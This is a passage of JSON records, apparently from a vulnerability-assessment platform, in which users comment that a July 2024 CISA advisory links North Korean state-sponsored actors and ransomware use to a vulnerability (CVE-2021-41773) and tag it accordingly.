      "revisionDate": "2024-07-26T15:33:29.383111Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "2e742be1-1968-4935-9a6d-a4cb2d572ab0",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "4bb9d3c7-37ef-4b65-b2a8-550afc30664c",
      "created": "2024-07-26T15:37:39.360841Z",
      "revisionDate": "2024-07-26T15:37:39.357195Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited more recently (since it's been exploited plenty before) or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a\r\n\r\nCISA KEV also [notes](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?search_api_fulltext=CVE-2021-41773&field_date_added_wrapper=all&sort_by=field_date_added&items_per_page=20&url=) this vulnerability has been used in ransomware attacks, so I'm adding that tag as well. ",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "19076e68-1c52-48c1-bc15-7f6a3053c357",
          "name": "CISA KEV Listed",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "cisa_kev_listed"
        },
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        },
        {
          "id": "def6357c-0771-400a-909d-2021d9f6b227",
          "name": "Observed in ransomware attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_ransomware"
        }
      ]
    },
    {
      "id": "d9b74f51-fa75-4f86-8181-46667c7e8140",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "2b625e9b-0860-4804-bb17-a11e174a8333",
      "created": "2024-07-26T19:24:10.462977Z",
      "revisionDate": "2024-07-26T19:24:10.46231Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "b8155ecf-90f0-49bc-b6ca-4c605fd3e200",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "5e25a3c4-9119-4321-acae-708453fa4b9b",
      "created": "2024-07-26T19:25:53.148626Z",
      "revisionDate": "2024-07-26T19:25:53.147988Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "f84de06a-d4b0-496a-a1b6-32583623c54e",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "bb686ea5-db7d-41d4-bc2f-966a6f46048b",
      "created": "2024-07-26T19:26:49.707759Z",
      "revisionDate": "2024-07-26T19:26:49.707294Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "e35b4ffa-fff3-4d1e-a4df-af54aff6dd26",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "9ae1a02c-ab77-47d3-925d-16f61a76b572",
      "created": "2024-07-26T19:27:43.949535Z",
      "revisionDate": "2024-08-07T15:37:55.330823Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 2,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "bb544b28-0e48-40d5-9787-dc00a072d081",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "c37a6d09-3959-43c2-b1ff-7037f8398846",
      "created": "2024-07-26T19:28:35.061182Z",
      "revisionDate": "2024-07-26T19:28:35.060556Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "759bb95e-f4e9-4379-a578-228f447786cb",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "9e1e5a73-8c4d-4a6a-96a5-14a9041aa2cb",
      "created": "2024-07-26T19:29:29.281939Z",
      "revisionDate": "2024-08-07T13:25:59.569232Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 2,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    },
    {
      "id": "0879983d-d4b8-4864-be14-5dae200c3a40",
      "editorId": "e28f53e6-cf6f-4b91-89be-6cb19dfd4315",
      "topicId": "ba4ddf1c-43b1-4233-9bfc-efc9f3b39267",
      "created": "2024-07-26T19:30:24.757049Z",
      "revisionDate": "2024-07-26T19:30:24.756539Z",
      "document": "A July 2024 bulletin from multiple U.S. government agencies indicates that North Korean state-sponsored attackers have demonstrated interest in this vulnerability \u2014 not immediately clear whether it was exploited or just used in reconnaissance/target selection: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-207a",
      "score": 1,
      "metadata": {},
      "tags": [
        {
          "id": "991a0301-5049-4e43-86af-feec9914e03a",
          "name": "Observed in State-sponsored attacks",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "observed_in_state_sponsored_attacks"
        }
      ]
    }
  ]
}